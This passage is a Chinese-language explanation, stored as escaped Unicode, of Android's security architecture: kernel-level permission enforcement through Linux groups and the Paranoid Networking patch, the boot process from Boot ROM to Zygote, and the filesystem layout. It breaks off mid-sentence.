\u6743\u9650\u53ea\u5141\u8bb8\u201c\u6240\u6709\u8005\"\u5e94\u7528\u5199\u5165\u5e76\u8bfb\u53d6\u6b64\u5f55\u3002\u6709\u4e00\u4e9b\u4f8b\u5916\u5e94\u8be5\u63d0\u5230\u3002\u4f7f\u7528\u76f8\u540c\u8bc1\u4e66\u7b7e\u540d\u7684\u5e94\u7528\u80fd\u591f\u5728\u5f7c\u6b64\u4e4b\u95f4\u5171\u4eab\u6570\u636e\uff0c\u53ef\u4ee5\u62e5\u6709\u76f8\u540c\u7684 UID \u6216\u751a\u81f3\u53ef\u4ee5\u5728\u76f8\u540c\u7684\u8fdb\u7a0b\u4e2d\u8fd0\u884c\u3002 \u8fd9\u4e9b\u67b6\u6784\u51b3\u7b56\u5728 Linux \u5185\u6838\u5c42\u4e0a\u5efa\u7acb\u4e86\u9ad8\u6548\u7684\u5e94\u7528\u6c99\u7bb1\u3002 \u8fd9\u79cd\u7c7b\u578b\u7684\u6c99\u7bb1\u5f88\u7b80\u5355\uff0c\u5e76\u57fa\u4e8eLinux \u53ef\u9009\u8bbf\u95ee\u63a7\u5236\u6a21\u578b\uff08DAC\uff09\u7684\u9a8c\u8bc1\u3002 \u5e78\u8fd0\u7684\u662f\uff0c\u56e0\u4e3a\u6c99\u76d2\u5728 Linux \u5185\u6838\u5c42\u4e0a\u6267\u884c\uff0c\u672c\u5730\u4ee3\u7801\u548c\u64cd\u4f5c\u7cfb\u7edf\u5e94\u7528\u4e5f\u53d7\u5230\u672c\u7ae0[3]\u4e2d\u6240\u63cf\u8ff0\u7684\u8fd9\u4e9b\u7ea6\u675f\u7684\u7ea6\u675f\u3002 2.2 Linux \u5185\u6838\u5c42\u4e0a\u7684\u6743\u9650\u7ea6\u675f \u00b6 \u901a\u8fc7\u5c06 Linux \u7528\u6237\u548c\u7ec4\u6240\u6709\u8005\u5206\u914d\u7ed9\u5b9e\u73b0\u6b64\u529f\u80fd\u7684\u7ec4\u4ef6\uff0c\u53ef\u4ee5\u9650\u5236\u5bf9\u67d0\u4e9b\u7cfb\u7edf\u529f\u80fd\u7684\u8bbf\u95ee\u3002 \u8fd9\u79cd\u7c7b\u578b\u7684\u9650\u5236\u53ef\u4ee5\u5e94\u7528\u4e8e\u7cfb\u7edf\u8d44\u6e90\uff0c\u5982\u6587\u4ef6\uff0c\u9a71\u52a8\u7a0b\u5e8f\u548c\u5957\u63a5\u5b57\u3002 Android \u4f7f\u7528\u6587\u4ef6\u7cfb\u7edf\u6743\u9650\u548c\u7279\u5b9a\u7684\u5185\u6838\u8865\u4e01\uff08\u79f0\u4e3a Paranoid Networking\uff09[13]\u6765\u9650\u5236\u4f4e\u7ea7\u7cfb\u7edf\u529f\u80fd\u7684\u8bbf\u95ee\uff0c\u5982\u7f51\u7edc\u5957\u63a5\u5b57\uff0c\u6444\u50cf\u673a\u8bbe\u5907\uff0c\u5916\u90e8\u5b58\u50a8\u5668\uff0c\u65e5\u5fd7\u8bfb\u53d6\u80fd\u529b\u7b49\u3002 \u4f7f\u7528\u6587\u4ef6\u7cfb\u7edf\u6743\u9650\u8bbf\u95ee\u6587\u4ef6\u548c\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u9650\u5236\u8fdb\u7a0b\u5bf9\u8bbe\u5907\u67d0\u4e9b\u529f\u80fd\u7684\u8bbf\u95ee\u3002\u4f8b\u5982\uff0c\u8fd9\u79cd\u6280\u672f\u88ab\u5e94\u7528\u4e8e\u9650\u5236\u5e94\u7528\u5bf9\u8bbe\u5907\u76f8\u673a\u7684\u8bbf\u95ee\u3002 /dev/ cam \u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f\u7684\u6743\u9650\u8bbe\u7f6e\u4e3a 0660 \uff0c\u5c5e\u4e8e root \u6240\u6709\u8005\u548c\u6444\u50cf\u673a\u6240\u6709\u8005\u7ec4\u3002\u8fd9\u610f\u5473\u7740\u53ea\u6709\u4ee5 root \u8eab\u4efd\u8fd0\u884c\u6216\u5305\u542b\u5728\u6444\u50cf\u673a\u7ec4\u4e2d\u7684\u8fdb\u7a0b\u624d\u80fd\u8bfb\u53d6\u548c\u5199\u5165\u6b64\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f\u3002\u56e0\u6b64\uff0c\u4ec5\u5305\u62ec\u5728\u76f8\u673a\u7ec4\u4e2d\u7684\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u4e0e\u76f8\u673a\u4ea4\u4e92\u3002\u6743\u9650\u6807\u7b7e\u548c\u76f8\u5e94\u7ec4\u4e4b\u95f4\u7684\u6620\u5c04\u5728\u6587\u4ef6\u6846\u67b6 /base/data/etc/platform.xml \u4e2d\u5b9a\u4e49\uff0c\u6458\u5f55\u5982\u6e05\u5355 2.1 \u6240\u793a\u3002\u56e0\u6b64\uff0c\u5728\u5b89\u88c5\u8fc7\u7a0b\u4e2d\uff0c\u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u5df2\u8bf7\u6c42\u8bbf\u95ee\u6444\u50cf\u673a\u529f\u80fd\uff0c\u5e76\u4e14\u7528\u6237\u5df2\u6279\u51c6\u8be5\u5e94\u7528\u7a0b\u5e8f\uff0c\u5219\u8fd8\u4f1a\u4e3a\u6b64\u5e94\u7528\u7a0b\u5e8f\u5206\u914d\u4e00\u4e2a\u6444\u50cf\u673a Linux \u7ec4 GID\uff08\u8bf7\u53c2\u9605\u6e05\u5355\uff09\u3002\u56e0\u6b64\uff0c\u6b64\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u4ece /dev/cam \u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f\u8bfb\u53d6\u4fe1\u606f\u3002 qa/\u3001/\u3001... <permissions> ... <permission name=\"android.permission.INTERNET\" > <group gid=\"inet\" /> </permission> <permission name=\"android.permission.CAMERA\" > <group gid=\"camera\" /> </permission><permission name=\"android.permission.READ_LOGS\" > <group gid=\"log\" /> </permission>...</permission> Android \u4e2d\u6709\u4e00\u4e9b\u5730\u65b9\u53ef\u4ee5\u7528\u4e8e\u8bbe\u7f6e\u6587\u4ef6\u3001\u9a71\u52a8\u548c Unix \u5957\u63a5\u5b57\u7684\u6587\u4ef6\u7cfb\u7edf\u6743\u9650\uff1a init \u7a0b \u5e8f\uff0c init.rc \u914d\u7f6e\u6587\u4ef6\uff0c ueventd.rc \u914d\u7f6e\u6587\u4ef6\u548c\u7cfb\u7edf ROM \u6587\u4ef6\u7cfb\u7edf\u914d\u7f6e\u6587\u4ef6\u3002 \u5b83\u4eec\u5728\u7b2c 3 \u7ae0\u4e2d\u4f1a\u8be6\u7ec6\u8ba8\u8bba\u3002 \u5728\u4f20\u7edf\u7684 Linux \u53d1\u884c\u7248\u4e2d\uff0c\u5141\u8bb8\u6240\u6709\u8fdb\u7a0b\u542f\u52a8\u7f51\u7edc\u8fde\u63a5\u3002 \u540c\u65f6\uff0c\u5bf9\u4e8e\u79fb\u52a8\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5fc5\u987b\u63a7 \u5236\u5bf9\u7f51\u7edc\u529f\u80fd\u7684\u8bbf\u95ee\u3002 \u4e3a\u4e86\u5728 Android \u4e2d\u5b9e\u73b0\u6b64\u63a7\u5236\uff0c\u9700\u8981\u6dfb\u52a0\u7279\u6b8a\u7684\u5185\u6838\u8865\u4e01\uff0c\u5c06\u7f51\u7edc\u8bbe\u65bd\u7684\u8bbf\u95ee\u9650\u5236\u4e8e\u5c5e\u4e8e\u7279\u5b9a Linux \u7ec4\u6216\u5177\u6709\u7279\u5b9a Linux \u529f\u80fd\u7684\u8fdb\u7a0b\u3002 \u8fd9\u4e9b\u9488\u5bf9 Android \u7684 Linux\u5185\u6838\u8865\u4e01\u5df2\u7ecf\u83b7\u5f97\u4e86 Paranoid \u7f51\u7edc\u7684\u540d\u79f0\u3002 \u4f8b\u5982\uff0c\u5bf9\u4e8e\u8d1f\u8d23\u7f51\u7edc\u901a\u4fe1\u7684 AF_INET \u5957\u63a5\u5b57\u5730\u5740\u65cf\uff0c\u6b64\u68c0\u67e5\u5728 kernel/net/ipv4/af_inet.c \u6587\u4ef6\u4e2d\u6267\u884c\uff08\u53c2\u89c1\u6e05\u5355\u4e2d\u7684\u4ee3\u7801\u7247\u6bb5\uff09\u3002 Linux\u7ec4\u548c Paranoid \u7f51\u7edc\u7684\u6743\u9650\u6807\u7b7e\u4e4b\u95f4\u7684\u6620\u5c04\u4e5f\u5728 platform.xml \u6587\u4ef6\u4e2d\u8bbe\u7f6e\uff08\u4f8b\u5982\uff0c\u53c2\u89c1\u6e05\u5355\u4e2d\u7684\u7b2c 4 \u884c\uff09\u3002 1 ... 2 # ifdef CONFIG_ANDROID_PARANOID_NETWORK 3 # include < linux / android_aid . h > 4 5 static inline int current_has_network ( void ) 6 { 7 return in_egroup_p ( AID_INET ) || capable ( CAP_NET_RAW ) ; 8 } 9 # else 10 static inline int current_has_network ( void ) 11 { 12 return 1 ; 13 } 14 # endif 15 ... 16 17 /* 18 * Create an inet socket . 19 */ 20 21 static int inet create ( struct net * net , struct socket * sock , int protocol , 22 int kern ) 23 { 24 ... 25 if ( ! current_has_network () ) 26 return \u2212 EACCES ; 27 ... 28 } \u7c7b\u4f3c\u7684 Paranoid \u7f51\u7edc\u8865\u4e01\u4e5f\u9002\u7528\u4e8e\u9650\u5236\u8bbf\u95ee IPv6 \u548c\u84dd\u7259[19]\u3002 \u8fd9\u4e9b\u68c0\u67e5\u4e2d\u4f7f\u7528\u7684\u5e38\u91cf\u5728\u5185\u6838\u4e2d\u786c\u7f16\u7801\uff0c\u5e76\u5728 kernel/include/linux/android_aid.h \u6587\u4ef6\u4e2d\u89c4\u5b9a \u56e0\u6b64\uff0c\u5728 Linux \u5185\u6838\u5c42\uff0c\u901a\u8fc7\u68c0\u67e5\u5e94\u7528\u7a0b\u5e8f\u662f\u5426\u5305\u542b\u5728\u7279\u6b8a\u9884\u5b9a\u4e49\u7684\u7ec4\u4e2d\u6765\u5b9e\u73b0 Android \u6743 \u9650\u3002 \u53ea\u6709\u6b64\u7ec4\u7684\u6210\u5458\u624d\u80fd\u8bbf\u95ee\u53d7\u4fdd\u62a4\u7684\u529f\u80fd\u3002 \u5728\u5e94\u7528\u7a0b\u5e8f\u5b89\u88c5\u671f\u95f4\uff0c\u5982\u679c\u7528\u6237\u5df2\u540c\u610f\u6240\u8bf7\u6c42 \u7684\u6743\u9650\uff0c\u5219\u8be5\u5e94\u7528\u7a0b\u5e8f\u5305\u62ec\u5728\u76f8\u5e94\u7684 Linux \u7ec4\u4e2d\uff0c\u56e0\u6b64\u83b7\u5f97\u5bf9\u53d7\u4fdd\u62a4\u529f\u80fd\u7684\u8bbf\u95ee\u3002 \u7b2c\u4e09\u7ae0 Android \u672c\u5730\u7528\u6237\u7a7a\u95f4\u5c42 \u00b6 3.1 Android \u5f15\u5bfc\u8fc7\u7a0b \u00b6 \u8981\u4e86\u89e3\u5728\u672c\u5730\u7528\u6237\u7a7a\u95f4\u5c42\u4e0a\u63d0\u4f9b\u5b89\u5168\u6027\u7684\u8fc7\u7a0b\uff0c\u9996\u5148\u5e94\u8003\u8651 Android \u8bbe\u5907\u7684\u5f15\u5bfc\u987a\u5e8f\u3002 \u8981\u6ce8\u610f\uff0c\u5728\u7b2c\u4e00\u6b65\u4e2d\uff0c\u8fd9\u4e2a\u987a\u5e8f\u53ef\u80fd\u4f1a\u56e0\u4e0d\u540c\u7684\u8bbe\u5907\u800c\u5f02\uff0c\u4f46\u662f\u5728 Linux \u5185\u6838\u52a0\u8f7d\u4e4b\u540e\uff0c\u8fc7\u7a0b\u901a\u5e38\u662f\u76f8\u540c\u7684\u3002 \u5f15\u5bfc\u8fc7\u7a0b\u7684\u6d41\u7a0b\u5982\u56fe \u5f53\u7528\u6237\u6253\u5f00\u667a\u80fd\u624b\u673a\u65f6\uff0c\u8bbe\u5907\u7684 CPU \u5904\u4e8e\u672a\u521d\u59cb\u5316\u72b6\u6001\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5904\u7406\u5668\u4ece\u786c\u8fde\u7ebf\u5730\u5740\u5f00\u59cb\u6267\u884c\u547d\u4ee4\u3002\u8be5\u5730\u5740\u6307\u5411 Boot ROM \u6240\u5728\u7684 CPU \u7684\u5199\u4fdd\u62a4\u5b58\u50a8\u5668\u4e2d\u7684\u4e00\u6bb5\u4ee3\u7801\uff08\u53c2\u89c1\u56fe \u4e2d\u7684\u6b65\u9aa4 1\uff09\u3002\u4ee3\u7801\u9a7b\u7559\u5728 Boot ROM \u4e0a\u7684\u4e3b\u8981\u76ee\u7684\u662f\u68c0\u6d4b Boot Loader\uff08\u5f15\u5bfc\u52a0\u8f7d\u7a0b\u5e8f\uff09\u6240\u5728\u7684\u4ecb\u8d28[17]\u3002\u68c0\u6d4b\u5b8c\u6210\u540e\uff0cBoot ROM \u5c06\u5f15\u5bfc\u52a0\u8f7d\u7a0b\u5e8f\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\uff08\u4ec5\u5728\u8bbe\u5907\u901a\u7535\u540e\u53ef\u7528\uff09\uff0c\u5e76\u8df3\u8f6c\u5230\u5f15\u5bfc Boot Loader \u7684\u52a0\u8f7d\u4ee3\u7801\u3002\u53cd\u8fc7\u6765\uff0cBoot Loader \u5efa\u7acb\u4e86\u5916\u90e8RAM\uff0c\u6587\u4ef6\u7cfb\u7edf\u548c\u7f51\u7edc\u7684\u652f\u6301\u3002\u4e4b\u540e\uff0c\u5b83\u5c06 Linux \u5185\u6838\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\uff0c\u5e76\u5c06\u63a7\u5236\u6743\u4ea4\u7ed9\u5b83\u3002 Linux \u5185\u6838\u521d\u59cb\u5316\u73af\u5883\u6765\u8fd0\u884c C \u4ee3\u7801\uff0c\u6fc0\u6d3b\u4e2d\u65ad\u63a7\u5236\u5668\uff0c\u8bbe\u7f6e\u5185\u5b58\u7ba1\u7406\u5355\u5143\uff0c\u5b9a\u4e49\u8c03\u5ea6\uff0c\u52a0\u8f7d\u9a71\u52a8\u7a0b\u5e8f\u548c\u6302\u8f7d\u6839\u6587\u4ef6\u7cfb\u7edf\u3002\u5f53\u5185\u5b58\u7ba1\u7406\u5355\u5143\u521d\u59cb\u5316\u65f6\uff0c\u7cfb\u7edf\u4e3a\u4f7f\u7528\u865a\u62df\u5185\u5b58\u4ee5\u53ca\u8fd0\u884c\u7528\u6237\u7a7a\u95f4\u8fdb\u7a0b[17]\u505a\u51c6\u5907\u3002\u5b9e\u9645\u4e0a\uff0c\u4ece\u8fd9\u4e00\u6b65\u5f00\u59cb\uff0c\u8be5\u8fc7\u7a0b\u5c31\u548c\u8fd0\u884c Linux \u7684\u53f0\u5f0f\u8ba1\u7b97\u673a\u4e0a\u53d1\u751f\u7684\u8fc7\u7a0b\u6ca1\u4ec0\u4e48\u533a\u522b\u4e86\u3002 \u7b2c\u4e00\u4e2a\u7528\u6237\u7a7a\u95f4\u8fdb\u7a0b\u662f init \uff0c\u5b83\u662f Android \u4e2d\u6240\u6709\u8fdb\u7a0b\u7684\u7956\u5148\u3002 \u8be5\u7a0b\u5e8f\u7684\u53ef\u6267\u884c\u6587\u4ef6\u4f4d\u4e8eAndroid \u6587\u4ef6\u7cfb\u7edf\u7684\u6839\u76ee\u5f55\u4e2d\u3002 \u6e05\u5355 3.1 \u5305\u542b\u6b64\u53ef\u6267\u884c\u6587\u4ef6\u7684\u4e3b\u8981\u90e8\u5206\u3002 \u53ef\u4ee5\u770b\u51fa\uff0c init \u4e8c\u8fdb\u5236\u8d1f\u8d23\u521b\u5efa\u6587\u4ef6\u7cfb\u7edf\u57fa\u672c\u6761\u76ee\uff087 \u5230 16 \u884c\uff09\u3002 \u4e4b\u540e\uff08\u7b2c 18 \u884c\uff09\uff0c\u7a0b\u5e8f\u89e3\u6790 init.rc \u914d\u7f6e\u6587\u4ef6\u5e76\u6267\u884c\u5176\u4e2d\u7684\u547d\u4ee4\u3002 1 int main ( int argc , char ** argv ) 2 { 3 ... 4 if ( ! strcmp ( basename ( argv [ 0 ] ), \"ueventd\" ) ) 5 return ueventd_main ( argc , argv ) ; 6 ... 7 mkdir ( \"/dev\" , 0755 ) ; 8 mkdir ( \"/proc\" , 0755 ) ; 9 mkdir ( \"/sys\" , 0755 ) ; 10 11 mount ( \"tmpfs\" , \"/dev\" , \"tmpfs\" , MS_NOSUID , \"mode=0755\" ) ; 12 mkdir ( \"/dev/pts\" , 0755 ) ; 13 mkdir ( \"/dev/socket\" , 0755 ) ; 14 mount ( \"devpts\" , \"/dev/pts\" , \"devpts\" , 0 , NULL ) ; 15 mount ( \"proc\" , \"/proc\" , \"proc\" , 0 , NULL ) ; 16 mount ( \"sysfs\" , \"/sys\" , \"sysfs\" , 0 , NULL ) ; 17 ... 18 init_parseconfig_file ( \"/init.rc\" ) ; 19 ... 20 } init.rc \u914d\u7f6e\u6587\u4ef6\u4f7f\u7528\u4e00\u79cd\u79f0\u4e3a Android Init Language \u7684\u8bed\u8a00\u7f16\u5199\uff0c\u4f4d\u4e8e\u6839\u76ee\u5f55\u4e0b\u3002 \u8fd9\u4e2a\u914d \u7f6e\u6587\u4ef6\u53ef\u4ee5\u88ab\u60f3\u8c61\u4e3a\u4e00\u4e2a\u52a8\u4f5c\u5217\u8868\uff08\u547d\u4ee4\u5e8f\u5217\uff09\uff0c\u5176\u6267\u884c\u7531\u9884\u5b9a\u4e49\u7684\u4e8b\u4ef6\u89e6\u53d1\u3002 \u4f8b\u5982\uff0c\u5728\u6e05 \u5355 3.2 \u4e2d\uff0c fs \uff08\u884c 1\uff09\u662f\u4e00\u4e2a\u89e6\u53d1\u5668\uff0c\u800c\u7b2c 4 - 7 \u884c\u4ee3\u8868\u52a8\u4f5c\u3002 \u5728 init.rc \u914d\u7f6e\u6587\u4ef6\u4e2d\u7f16\u5199 \u7684\u547d\u4ee4\u5b9a\u4e49\u7cfb\u7edf\u5168\u5c40\u53d8\u91cf\uff0c\u4e3a\u5185\u5b58\u7ba1\u7406\u8bbe\u7f6e\u57fa\u672c\u5185\u6838\u53c2\u6570\uff0c\u914d\u7f6e\u6587\u4ef6\u7cfb\u7edf\u7b49\u3002\u4ece\u5b89\u5168\u89d2\u5ea6\u6765 \u770b\uff0c\u66f4\u91cd\u8981\u7684\u662f\u5b83\u8fd8\u8d1f\u8d23\u57fa\u672c\u6587\u4ef6\u7cfb\u7edf\u7ed3\u6784\u7684\u521b\u5efa\uff0c\u5e76\u4e3a\u521b\u5efa\u7684\u8282\u70b9\u5206\u914d\u6240\u6709\u8005\u548c\u6587\u4ef6\u7cfb\u7edf \u6743\u9650 \u6b64\u5916\uff0c init \u7a0b\u5e8f\u8d1f\u8d23\u5728 Android \u4e2d\u542f\u52a8\u51e0\u4e2a\u57fa\u672c\u7684\u5b88\u62a4\u8fdb\u7a0b\u548c\u8fdb\u7a0b\uff08\u53c2\u89c1\u56fe 3.1 \u4e2d\u7684\u6b65\u9aa4 5\uff09\uff0c\u5176\u53c2\u6570\u4e5f\u5728 init.rc \u6587\u4ef6\u4e2d\u5b9a\u4e49\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5728 Linux \u4e2d\u6267\u884c\u7684\u8fdb\u7a0b\u4ee5\u4e0e\u7956\u5148\u76f8\u540c\u7684 \u6743\u9650\uff08\u5728\u76f8\u540c\u7684 UID\u4e0b\uff09\u8fd0\u884c\u3002 \u5728 Android \u4e2d\uff0c init \u4ee5 root \u6743\u9650\uff08 UID == 0 \uff09\u542f\u52a8\u3002 \u8fd9 \u610f\u5473\u7740\u6240\u6709\u540e\u4ee3\u8fdb\u7a0b\u5e94\u8be5\u4f7f\u7528\u76f8\u540c\u7684 UID \u8fd0\u884c\u3002 \u5e78\u8fd0\u7684\u662f\uff0c\u7279\u6743\u8fdb\u7a0b\u53ef\u4ee5\u5c06\u5176 UID \u6539\u53d8\u4e3a\u8f83 \u5c11\u7279\u6743\u7684\u8fdb\u7a0b\u3002 \u56e0\u6b64\uff0c init \u8fdb\u7a0b\u7684\u6240\u6709\u540e\u4ee3\u53ef\u4ee5\u4f7f\u7528\u8be5\u529f\u80fd\u6765\u6307\u5b9a\u6d3e\u751f\u8fdb\u7a0b\u7684 UID \u548c GID\uff08\u6240\u6709\u8005\u548c\u7ec4\u4e5f\u5728 init.rc \u6587\u4ef6\u4e2d\u5b9a\u4e49\uff09\u3002 \u7b2c\u4e00\u4e2a\u5b88\u62a4\u8fdb\u7a0b\u6d3e\u751f\u4e8e init \u8fdb\u7a0b\uff0c\u5b83\u662f ueventd \u5b88\u62a4\u8fdb\u7a0b\u3002 \u8fd9\u4e2a\u670d\u52a1\u8fd0\u884c\u81ea\u5df1\u7684 main \u51fd\u6570 \uff08\u53c2\u89c1\u6e05\u5355 3.1 \u4e2d\u7684\u7b2c 5 \u884c\uff09\uff0c\u5b83\u8bfb\u53d6 ueventd.rc \u548c ueventd.[device name].rc \u914d\u7f6e\u6587\u4ef6\uff0c \u5e76\u91cd\u653e\u6307\u5b9a\u7684\u5185\u6838 uevent_hotplug \u4e8b\u4ef6\u3002 \u8fd9\u4e9b\u4e8b\u4ef6\u8bbe\u7f6e\u4e86\u4e0d\u540c\u8bbe\u5907\u7684\u6240\u6709\u8005\u548c\u6743\u9650\uff08\u53c2\u89c1\u6e05 \u5355 3.3\uff09\u3002 \u4f8b\u5982\uff0c\u7b2c 5 \u884c\u663e\u793a\u4e86\u5982\u4f55\u8bbe\u7f6e\u6587\u4ef6\u7cfb\u7edf\u5bf9 / dev/cam \u8bbe\u5907\u7684\u6743\u9650\uff0c2.2 \u8282\u4e2d\u4f1a\u6d89\u53ca \u8fd9\u4e2a\u4f8b\u5b50\u3002 \u4e4b\u540e\uff0c\u5b88\u62a4\u8fdb\u7a0b\u7b49\u5f85\u76d1\u542c\u6240\u6709\u672a\u6765\u7684\u70ed\u63d2\u62d4\u4e8b\u4ef6\u3002 \u7531 init \u7a0b\u5e8f\u542f\u52a8\u7684\u6838\u5fc3\u670d\u52a1\u4e4b\u4e00\u662f servicemanager \uff08\u8bf7\u53c2\u9605\u56fe 3.1 \u4e2d\u7684\u6b65\u9aa4 5\uff09\u3002 \u6b64\u670d\u52a1\u5145 \u5f53\u5728 Android \u4e2d\u8fd0\u884c\u7684\u6240\u6709\u670d\u52a1\u7684\u7d22\u5f15\u3002 \u5b83\u5fc5\u987b\u5728\u65e9\u671f\u9636\u6bb5\u53ef\u7528\uff0c\u56e0\u4e3a\u4ee5\u540e\u542f\u52a8\u7684\u6240\u6709\u7cfb\u7edf \u670d\u52a1\u90fd\u5e94\u8be5\u6709\u53ef\u80fd\u6ce8\u518c\u81ea\u5df1\uff0c\u4ece\u800c\u5bf9\u64cd\u4f5c\u7cfb\u7edf\u7684\u5176\u4f59\u90e8\u5206\u53ef\u89c1[19]\u3002 init \u8fdb\u7a0b\u542f\u52a8\u7684\u53e6\u4e00\u4e2a\u6838\u5fc3\u8fdb\u7a0b\u662f Zygote\u3002 Zygote \u662f\u4e00\u4e2a\u70ed\u8eab\u5b8c\u6bd5\u7684\u7279\u6b8a\u8fdb\u7a0b\u3002 \u8fd9\u610f\u5473\u7740 \u8be5\u8fdb\u7a0b\u5df2\u7ecf\u88ab\u521d\u59cb\u5316\u5e76\u4e14\u94fe\u63a5\u5230\u6838\u5fc3\u5e93\u3002 Zygote \u662f\u6240\u6709\u8fdb\u7a0b\u7684\u7956\u5148\u3002 \u5f53\u4e00\u4e2a\u65b0\u7684\u5e94\u7528\u542f\u52a8 \u65f6\uff0cZygote \u4f1a\u6d3e\u751f\u81ea\u5df1\u3002 \u4e4b\u540e\uff0c\u4e3a\u6d3e\u751f\u5b50\u8fdb\u7a0b\u8bbe\u7f6e\u5bf9\u5e94\u4e8e\u65b0\u5e94\u7528\u7684\u53c2\u6570\uff0c\u4f8b\u5982 UID\uff0c GID\uff0c nice-name \u7b49\u3002 \u5b83\u80fd\u591f\u52a0\u901f\u65b0\u8fdb\u7a0b\u7684\u521b\u5efa\uff0c\u56e0\u4e3a\u4e0d\u9700\u8981\u5c06\u6838\u5fc3\u5e93\u590d\u5236\u5230\u65b0\u8fdb\u7a0b\u4e2d\u3002 \u65b0 \u8fdb\u7a0b\u7684\u5185\u5b58\u5177\u6709\u201c\u5199\u65f6\u590d\u5236\"\uff08COW\uff09\u4fdd\u62a4\uff0c\u8fd9\u610f\u5473\u7740\u53ea\u6709\u5f53\u540e\u8005\u5c1d\u8bd5\u5199\u5165\u53d7\u4fdd\u62a4\u7684\u5185\u5b58\u65f6\uff0c \u6570\u636e\u624d\u4f1a\u4ece zygote \u8fdb\u7a0b\u590d\u5236\u5230\u65b0\u8fdb\u7a0b\u3002 \u4ece\u800c\uff0c\u6838\u5fc3\u5e93\u4e0d\u4f1a\u6539\u53d8\uff0c\u5b83\u4eec\u53ea\u4fdd\u7559\u5728\u4e00\u4e2a\u5730\u65b9\uff0c\u51cf \u5c11\u5185\u5b58\u6d88\u8017\u548c\u5e94\u7528\u542f\u52a8\u65f6\u95f4\u3002 \u4f7f\u7528 Zygote \u8fd0\u884c\u7684\u7b2c\u4e00\u4e2a\u8fdb\u7a0b\u662f System Server\uff08\u56fe 3.1 \u4e2d\u7684\u6b65\u9aa4 6\uff09\u3002 \u8fd9\u4e2a\u8fdb\u7a0b\u9996\u5148\u8fd0\u884c \u672c\u5730\u670d\u52a1\uff0c\u4f8b\u5982 SurfaceFlinger \u548c SensorService\u3002 \u5728\u670d\u52a1\u521d\u59cb\u5316\u4e4b\u540e\uff0c\u8c03\u7528\u56de\u8c03\uff0c\u542f\u52a8\u5269 \u4f59\u7684\u670d\u52a1\u3002 \u6240\u6709\u8fd9\u4e9b\u670d\u52a1\u4e4b\u540e\u4f7f\u7528 servicemanager \u6ce8\u518c\u3002 3.2 Android \u6587\u4ef6\u7cfb\u7edf \u00b6 \u867d\u7136 Android \u57fa\u4e8e Linux \u5185\u6838\uff0c\u5b83\u7684\u6587\u4ef6\u7cfb\u7edf\u5c42\u6b21\u4e0d\u7b26\u5408\u6587\u4ef6\u7cfb\u7edf\u5c42\u6b21\u6807\u51c6[10]\uff0c\u5b83\u4e86\u5b9a\u4e49\u7c7b Unix \u7cfb\u7edf\u7684\u6587\u4ef6\u7cfb\u7edf\u5e03\u5c40\uff08\u89c1\u6e05\u5355 3.4\uff09\u3002 Android \u548c Linux \u4e2d\u7684\u67d0\u4e9b\u76ee\u5f55\u662f\u76f8\u540c\u7684\uff0c\u4f8b \u5982 /dev \uff0c /proc \uff0c /sys \uff0c /etc \uff0c /mnt \u7b49\u3002\u8fd9\u4e9b\u6587\u4ef6\u5939\u7684\u7528\u9014\u4e0e Linux \u4e2d\u7684\u76f8\u540c\u3002 \u540c \u65f6\uff0c\u8fd8\u6709\u4e00\u4e9b\u76ee\u5f55\uff0c\u5982 /system \uff0c /data \u548c /cache \uff0c\u5b83\u4eec\u4e0d\u5b58\u5728\u4e8e Linux \u7cfb\u7edf\u4e2d\u3002\u8fd9\u4e9b\u6587\u4ef6 \u5939\u662f Android \u7684\u6838\u5fc3\u90e8\u5206\u3002 \u5728 Android \u64cd\u4f5c\u7cfb\u7edf\u7684\u6784\u5efa\u671f\u95f4\uff0c\u4f1a\u521b\u5efa\u4e09\u4e2a\u6620\u50cf\u6587 \u4ef6\uff1a system.img \uff0c userdata.img \u548c cache.img \u3002 \u8fd9\u4e9b\u6620\u50cf\u63d0\u4f9b Android \u7684\u6838\u5fc3\u529f\u80fd\uff0c\u662f\u5728\u8bbe \u5907\u7684\u95ea\u5b58\u4e0a\u5b58\u50a8\u7684\u3002 \u5728\u7cfb\u7edf\u5f15\u5bfc\u671f\u95f4\uff0c init \u7a0b\u5e8f\u5c06\u8fd9\u4e9b\u6620\u50cf\u5b89\u88c5\u5230\u9884\u5b9a\u4e49\u7684\u5b89\u88c5\u70b9\uff0c \u5982 /system \uff0c /data \u548c /cache /system \u5206\u533a\u5305\u542b\u6574\u4e2a Android \u64cd\u4f5c\u7cfb\u7edf\uff0c\u9664\u4e86 Linux \u5185\u6838\uff0c\u5b83\u672c\u8eab\u4f4d\u4e8e /boot \u5206\u533a\u4e0a\u3002 \u6b64 \u6587\u4ef6\u5939\u5305\u542b\u5b50\u76ee\u5f55 /system/bin \u548c /system/lib \uff0c\u5b83\u4eec\u76f8\u5e94\u5305\u542b\u6838\u5fc3\u672c\u5730\u53ef\u6267\u884c\u6587\u4ef6\u548c\u5171\u4eab \u5e93\u3002 \u6b64\u5916\uff0c\u6b64\u5206\u533a\u5305\u542b\u7531\u7cfb\u7edf\u6620\u50cf\u9884\u5148\u6784\u5efa\u7684\u6240\u6709\u7cfb\u7edf\u5e94\u7528\u3002 \u6620\u50cf\u4ee5\u53ea\u8bfb\u6a21\u5f0f\u5b89\u88c5\uff08\u53c2\u89c1\u6e05 \u5355 3.2 \u4e2d\u7684\u7b2c 5 \u884c\uff09\u3002 \u56e0\u6b64\uff0c\u6b64\u5206\u533a\u7684\u5185\u5bb9\u4e0d\u80fd\u5728\u8fd0\u884c\u65f6\u66f4\u6539\u3002 \u56e0\u6b64\uff0c /system \u5206\u533a\u88ab\u6302\u8f7d\u4e3a\u53ea\u8bfb\uff0c\u5b83\u4e0d\u80fd\u7528\u4e8e\u5b58\u50a8\u6570\u636e\u3002 \u4e3a\u6b64\uff0c\u5355\u72ec\u7684\u5206\u533a /data \u8d1f\u8d23\u5b58 \u50a8\u968f\u65f6\u95f4\u6539\u53d8\u7684\u7528\u6237\u6570\u636e\u6216\u4fe1\u606f\u3002 \u4f8b\u5982\uff0c /data/app 